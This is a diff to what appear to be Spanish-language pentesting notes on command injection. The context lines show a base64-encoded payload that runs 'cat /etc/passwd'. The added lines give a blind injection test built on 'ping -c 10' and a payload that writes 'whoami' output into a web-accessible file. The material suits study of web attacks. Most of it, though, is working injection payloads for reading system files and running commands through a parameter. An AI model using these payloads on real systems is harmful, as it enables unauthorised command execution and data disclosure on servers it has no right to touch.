@@ -64,3 +64,12 @@ echo -n 'cat /etc/passwd | grep 33' | base64
 resultado: Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
 payload: bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 
+
+################### Blind command injection
+Podemos probar blind command injections utilizando comandos que incluyan un temporizador:
+parametro= x||ping+-c+10+127.0.0.1||
+
+Redirecting Output:
+Podemos también crear archivos internos con la información de los comandos, de esta manera podremos luego visitar el archivo
+creado y consultar el resultado:
+& whoami > /var/www/static/whoami.txt &
